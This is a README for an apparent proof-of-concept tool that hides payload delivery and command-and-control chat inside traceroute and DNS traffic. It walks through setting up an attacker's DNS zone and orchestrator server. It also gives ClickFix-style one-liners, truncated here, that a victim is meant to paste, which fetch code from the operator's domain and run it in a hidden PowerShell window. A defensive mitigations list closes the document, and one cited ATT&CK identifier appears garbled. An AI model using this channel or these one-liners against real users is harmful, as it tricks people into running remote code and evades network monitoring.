# Tracer-Terminal / Tracer-Talk

A proof-of-concept demonstrating DNS covert channels via `tracert`/`traceroute`. The server (Orchestrator) delivers an encrypted chat client through ICMP fake hops and maintains full-duplex encrypted chat -- all disguised as routine network diagnostic traffic. The vulnerability design is called **Tracer-Terminal**; the chat protocol it enables is **Tracer-Talk**.

**For security research purposes only. See [LICENSE](LICENSE) for terms and disclaimer.**

## How It Works

The Orchestrator listens on port 53 (DNS) and ICMP. When a "victim" or remote actor runs a `tracert` command (via a ClickFix-style one-liner), the server:

1. Responds to the DNS A-record query for the target subdomain (the resolved IP doubles as the XOR encryption key)
2. Creates fake ICMP hops by responding with "Time Exceeded" messages from spoofed IPs
3. Serves PTR records for each spoofed IP containing encrypted hex-encoded payload shards
4. The victim's `tracert` output displays these shard hostnames, which the one-liner extracts, decodes, and executes

The delivered payload is a compact chat client that continues to communicate bidirectionally over tracert commands.

## Architecture

```
                  Orchestrator (Python)
                  +---------------------------+
                  |  DNS Handler (port 53)    |  <-- Subdomain command routing
                  |  ICMP Tunnel (Scapy)      |  <-- Fake hop factory
                  |  Session Manager          |  <-- Per-client state
                  |  Shard Encoder            |  <-- Payload chunking + crypto
                  |  Chat CLI                 |  <-- Server operator interface
                  +---------------------------+
                           |
              tracert / traceroute queries
                           |
                  +---------------------------+
                  |  Client (zero deps)       |
                  |  Bootstrap one-liner      |  <-- Downloads + executes payload
                  |  Chat client (.bat/.ps1/.sh)  <-- Bidirectional chat
                  +---------------------------+
```

## Subdomain Command Map

All client communication uses `tracert [command].lab.yourdomain.com`:

| Pattern | Direction | Purpose |
|---------|-----------|---------|
| `payload.lab.d.com` | Downlink | Deliver chat client as encrypted PTR shards across fake hops |
| `key.lab.d.com` | Downlink | A-record IP = 4-byte XOR session key |
| `[hex].tx.lab.d.com` | Uplink | Client sends XOR-encrypted hex-encoded message in subdomain |
| `rx.lab.d.com` | Downlink | Client polls for messages via fake-hop PTR shards |
| `ack.lab.d.com` | Uplink | Client acknowledges receipt of last downlink |
| `end.lab.d.com` | Uplink | Session teardown |

## Shard Capacity

Each fake hop carries a PTR hostname up to 253 characters (RFC 1035). The shard encoder auto-calculates capacity based on the configured domain:

- FQDN limit: 253 chars
- Domain suffix `.lab.yourdomain.com`: 17 chars
- Available per hop: ~233 hex chars across 4 labels (~116 bytes)
- Default 30-hop tracert with ~15 usable hops: **~1,740 bytes**
- Best case (short route, 28 hops): **~3,248 bytes**

## Prerequisites

**Server** (Linux recommended):
- Python 3.10+
- Root/admin access (raw sockets + port 53)

**Client** (zero external dependencies):
- Windows: `tracert.exe` + `powershell.exe` (built-in)
- Linux/macOS: `traceroute` + `bash` + `grep` (standard)

## DNS Setup (Any Registrar)

Two DNS records at your domain registrar:

**1. Glue A Record** (nameserver address):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `ns1` | A | 30 min | `YOUR_SERVER_IP` |

**2. NS Delegation** (delegates subdomain zone):

| Name | Type | TTL | Value |
|------|------|-----|-------|
| `lab` | NS | 30 min | `ns1.yourdomain.com` |

This routes all `*.lab.yourdomain.com` queries to your server on port 53.

**Cloudflare note**: Use "DNS Only" (grey cloud) for the ns1 A record.

## Server Setup

```bash
# Install dependencies
pip install -r requirements.txt

# Open firewall (Linux)
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
sudo iptables -A INPUT -p icmp -j ACCEPT
# Suppress kernel ICMP replies so Scapy handles them
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j DROP

# Start orchestrator with a payload
sudo python -m server.orchestrator --payload clients/chat_client.ps1

# Or specify custom domain/IP
sudo python -m server.orchestrator \
  --payload clients/chat_client.sh \
  --domain lab.yourdomain.com \
  --ip 1.2.3.4
```

## Usage

### Server Side

```
[*] Tracer Terminal Orchestrator
[*] Domain zone: lab.quasarke.net
[*] Server IP / XOR key: 96.38.118.3 -> [96, 38, 118, 3]
[*] Payload loaded: clients/chat_client.ps1 (1009 bytes)
[*] Payload encoded into 9 data shards + end marker
[*] Server ready. Waiting for connections...
[*] Commands: /list  /select <ip>  /quit

[+] New client: 203.0.113.50
[>] Delivering payload to 203.0.113.50 (9 shards)

server> /list
  203.0.113.50  [CHATTING]  inbox:0  outbox:0

server> /select 203.0.113.50
[*] Selected: 203.0.113.50

server> Hello from the server!
[*] Queued for 203.0.113.50 (will deliver on next rx poll)

[203.0.113.50] Hi back!
```

### Client Side (Bootstrap)

The victim pastes one of these commands. Each uses only built-in OS tools:

**PowerShell** (copy-paste into PowerShell or Win+R):
```
powershell -w h -nop -c "$z='lab.quasarke.net';$t=tracert payload.$z;..."
```
(See `bootstrap/bootstrap_ps.txt` for the full command)

**CMD** (copy-paste into cmd.exe):
```
@tracert payload.lab.quasarke.net>%tmp%\tt.txt&powershell -nop -w h -c "..."
```
(See `bootstrap/bootstrap_cmd.txt` for the full command)

**Bash** (copy-paste into terminal):
```bash
z=lab.quasarke.net;t=$(traceroute payload.$z 2>&1);k=(96 38 118 3);...
```
(See `bootstrap/bootstrap_bash.txt` for the full command)

### Chat Client (After Delivery)

Once the bootstrap delivers and executes the chat client:

```
=== Tracer Terminal Chat ===
Type message, Enter to send. /quit to exit.
you: Hello from the client!
server: Hello from the server!
you: /quit
Disconnected.
```

## Protocol Flow

```
                   Client                          Server
                     |                               |
  Bootstrap:         |  tracert payload.lab.d.com    |
  1. DNS A query --> |  --------------------------> |  [Orchestrator routes to PayloadBuilder]
  2. ICMP probes --> |  --------------------------> |  [ICMP Tunnel: fake hops with PTR shards]
  3. PTR lookups <-- |  <-------------------------- |  [DNS: shard hostnames per hop]
  4. Decode+exec     |                               |
                     |                               |
  Chat loop:         |                               |
  5. Send msg:       |  tracert [hex].tx.lab.d.com  |
     DNS query ----> |  --------------------------> |  [UplinkParser: extract message]
                     |                               |
  6. Poll:           |  tracert rx.lab.d.com        |
     ICMP probes --> |  --------------------------> |  [MsgBuilder: fake hops with response]
     PTR lookups <-- |  <-------------------------- |  [DNS: message shards]
  7. Decode+display  |                               |
                     |                               |
  8. Ack:            |  tracert ack.lab.d.com       |
     DNS query ----> |  --------------------------> |  [Clear send buffer]
```

## Encryption

- **Algorithm**: XOR with 4-byte repeating key
- **Key source**: Server IP address octets (e.g., `96.38.118.3` = `[0x60, 0x26, 0x76, 0x03]`)
- **Encoding**: Hex (0-9, a-f) for DNS-safe transport
- **Compression**: zlib applied before encryption for payload delivery

## File Structure

```
tracerterminal/
  server/
    orchestrator.py       # Director: wires components, manages sessions, chat CLI
    dns_handler.py        # dnslib DNS server with subdomain command routing
    icmp_tunnel.py        # Scapy ICMP fake-hop factory
    shard_encoder.py      # Payload chunking, XOR crypto, hex encoding
    config.py             # Domain, IP, capacity constants (auto-calculated)
  clients/
    chat_client.bat       # CMD chat client (1065 bytes)
    chat_client.ps1       # PowerShell chat client (1009 bytes)
    chat_client.sh        # Bash chat client (1126 bytes)
  bootstrap/
    bootstrap_cmd.txt     # CMD one-liner (432 bytes)
    bootstrap_ps.txt      # PowerShell one-liner (446 bytes)
    bootstrap_bash.txt    # Bash one-liner (288 bytes)
  requirements.txt
  README.md
```

## Security Research Context

This PoC demonstrates that:

1. **tracert/traceroute output can be weaponized** as a payload delivery mechanism by spoofing ICMP hops and controlling PTR records
2. **DNS subdomain queries** provide a covert uplink channel that looks like routine diagnostic traffic
3. **Standard network monitoring** focused on TCP/HTTP is blind to this ICMP+DNS channel
4. **No special client software** is needed -- the attack uses only built-in OS diagnostic tools

Related work:
- ClickFix attacks (2026) extracting payloads from DNS Name fields
- MITRE ATT&CK FGT1048.501 (Covert DNS Exfiltration)
- CWE-350 (Reliance on Reverse DNS for security decisions)
- DNS tunneling campaigns (TrkCdn, Iodine, DNSCat2)

## Mitigations

- Enforce `tracert -d` / `traceroute -n` (disables PTR resolution)
- Monitor for high-entropy PTR hostnames in DNS traffic
- DNS firewalls that strip shell-sensitive characters from PTR responses
- Block ICMP Time Exceeded from unexpected sources
- Rate-limit DNS PTR queries from single hosts
# Tracer-Talk
